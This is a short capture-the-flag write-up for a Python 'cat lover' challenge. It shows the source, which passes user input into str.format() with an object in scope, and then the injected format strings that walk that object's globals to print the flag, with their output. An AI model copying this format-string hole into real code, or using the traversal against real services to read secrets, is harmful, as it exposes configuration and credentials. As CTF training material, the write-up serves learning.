
##### this was a misc challenge

## source code 
- challenge.py
```python
import flag  
from rich.console import Console  
from rich.table import Table  
  
console = Console()  
table = Table()  
  
class CATS:  
   def __init__(meow, name):  
       meow.name = name  
  
def meow(name,cats):  
       console.print(f"[blue]Prrrrr [yellow]{name}[/yellow] ₍^⸝⸝> ·<032b> <⸝⸝ ^₎[/blue]".format(cats=cats))  
  
  
if __name__ == "__main__":  
   cats = CATS("Tom")  
   table.add_column("Description", justify="center", style="cyan", no_wrap=True)  
   table.add_row("Welcome to the CAT Lover Challenge!₍^ >ヮ<^₎")  
   console.print(table)  
   while True:  
       try:  
		name = console.input("[bold green]Enter your cat name:[/bold green] ")
		meow(name,cats)
       except Exception as err:
		#print(err)
		console.print("Meowrr 😾")
```

flag.py
```python
CATF = 'CATF{dummy}'
```

##### from the first look we have `Expression Language injection` , we can control the `cats` object

##### connected to challenge using nc 

```bash

#first check for global variables 
Enter your cat name: {cats.init.globals}
Prrrrr {'name': 'main', 'doc': None, 'package': None, 
'loader': <_frozen_importlib_external.SourceFileLoader object at 
0x7f2428609c10>, 'spec': None, 'annotations': {}, 'builtins': 
<module 'builtins' (built-in)>, 'file': '/app/challenge.py', 'cached': 
None, 'flag': <module 'flag' from '/app/flag.py'>, 'Console': <class 
'rich.console.Console'>, 'Table': <class 'rich.table.Table'>, 'console': 
<console width=80 None>, 'table': <rich.table.Table object at 0x7f24283cb730>, 
'CATS': <class 'main.CATS'>, 'meow': <function meow at 0x7f24285d80d0>, 
'cats': <main.CATS object at 0x7f24283cb790>, 'name': 
'{cats.init.globals} '}  ₍^⸝⸝> ·̫ <⸝⸝ ^₎

#we flag module which contain the CATF variable which is the flag
Enter your cat name: {cats.init.globals[flag]}
Prrrrr <module 'flag' from '/app/flag.py'> ₍^⸝⸝> ·̫ <⸝⸝ ^₎

#access the CATF variable
Enter your cat name: {cats.init.globals[flag].CATF}
Prrrrr CATF{F0rM4t_Str1nG$_1n_N00dl3SL4nG!!!} ₍^⸝⸝> ·̫ <⸝⸝ ^₎
```

